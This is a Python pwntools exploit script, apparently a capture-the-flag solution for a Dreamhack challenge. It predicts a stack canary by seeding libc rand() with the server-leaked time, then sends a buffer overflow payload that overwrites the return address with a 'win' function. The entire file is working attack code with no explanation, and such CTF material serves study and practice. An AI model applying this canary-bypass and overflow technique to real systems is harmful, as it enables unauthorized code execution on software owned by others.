from ctypes import CDLL
from pwn import *

context.log_level = 'debug'

p = remote('host1.dreamhack.games', 20198)
e = ELF('./prob')
# p = e.process()

libc = CDLL('./libc.so.6')

p.recvuntil(b'time: ')
t = int(p.recvline())
libc.srand(t)

canary = 0

for i in range(8):
    canary %= 2**56
    canary *= 2**8
    canary |= (0xff & libc.rand())

win = 0x401291 + 0x8
payload = b'A' * 0x10 + p64(canary) + b'B' * 0x10 + p64(win)

pause()

p.sendlineafter(b'data: ', payload)

p.interactive()